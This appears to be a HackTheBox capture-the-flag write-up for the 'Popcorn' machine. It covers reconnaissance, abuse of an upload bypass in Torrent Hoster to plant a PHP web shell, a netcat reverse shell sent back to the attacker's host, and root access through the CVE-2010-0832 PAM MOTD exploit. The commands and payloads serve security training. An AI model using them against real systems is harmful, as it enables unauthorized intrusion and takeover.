# Popcorn - HackTheBox Writeup (Anonymized)

## Machine Info

- **Name:** Popcorn
- **OS:** Linux (Ubuntu 9.10)
- **Difficulty:** Medium 
- **Target IP:** X.X.X.X
- **Attacker IP:** Y.Y.Y.Y

---

## 1. Reconnaissance

### Initial Nmap Scan

```bash
nmap -sCV X.X.X.X
```

**Results:**
```
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.12 (Ubuntu)
Service Info: Host: popcorn.hackthebox.gr; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Add Hosts Entry

```bash
echo "X.X.X.X popcorn.htb" | sudo tee -a /etc/hosts
```

---

## 2. Web Enumeration

### Directory Brute-forcing

```bash
gobuster dir -u http://popcorn.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Discovered:**
- `/torrent/` - Torrent Hoster CMS
- `/test/` 
- `/rename/` 

### Enumerate Torrent Hoster

```bash
gobuster dir -u http://popcorn.htb/torrent/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Found:**
- `/torrent/upload/` - Upload directory
- /`torrent/database/` - Contains SQL dump
- `/torrent/admin/` - Admin panel
- `/torrent/users/` - User directory

---

## 3. Initial Foothold

### Vulnerability: File Upload Bypass

First, you need to upload the correct.torrent file and then update it via the "screenshot" option, adding a file with the.png.php extension containing PHP cmd shell

```php
<?php echo system($_GET[‘cmd’]); ?>
```

### Upload Shell

1. Register account on torrent hoster
2. Upload `example.torrent`
3. Update by adding `update.png.php`
4. Find shell at: `http://popcorn.htb/torrent/upload/<hash>.php`

### Execute Commands

```bash
curl "http://popcorn.htb/torrent/upload/<hash>.php?cmd=id"
```

### Get Reverse Shell

```bash
# Terminal 1
nc -lvnp 4444

# Terminal 2
curl "http://popcorn.htb/torrent/upload/<hash>.php?cmd=nc -e /bin/sh <LAB IP> <PORT>
```

### Upgrade Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 4. Privilege Escalation

### Enumeration

```bash
# Check OS
cat /etc/issue
# Ubuntu 9.10

# Check kernel
uname -r

# Check for .cache directory
ls -la /home/george/.cache/
# Found: motd.legal-displayed

# Check writable files
find / -writable -type f 2>/dev/null | grep -v proc
```

### Vulnerability: CVE-2010-0832 (PAM MOTD)

Ubuntu 9.10 is vulnerable to PAM MOTD file tampering.

### Exploit

1. Download exploit from Exploit-DB 14339 (or from metasploit)
2. Transfer to target
3. Execute:

```bash
chmod +x 14339.sh
./14339.sh
```

**Exploit creates user `toor` with password `toor` (UID 0)**

### Get Root

```bash
# Password: toor

id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## 5. Capture Flags

### User Flag

```bash
cat /home/george/user.txt
```

### Root Flag

```bash
cat /root/root.txt
```

---

## Summary

Popcorn demonstrates:

1. **File Upload Bypass**: Torrent validation bypassed by appending PHP to valid torrent file
2. **Information Disclosure**: SQL dump and writable directories exposed
3. **Outdated Software**: Ubuntu 9.10 with PAM vulnerability
4. **Local Privilege Escalation**: CVE-2010-0832 (PAM MOTD file tampering)

**Key Takeaways:**

- Always check for file upload vulnerabilities
- Look for information disclosure in exposed directories
- Old systems often have known privilege escalation paths
- CVE-2010-0832 is a classic Linux privesc technique

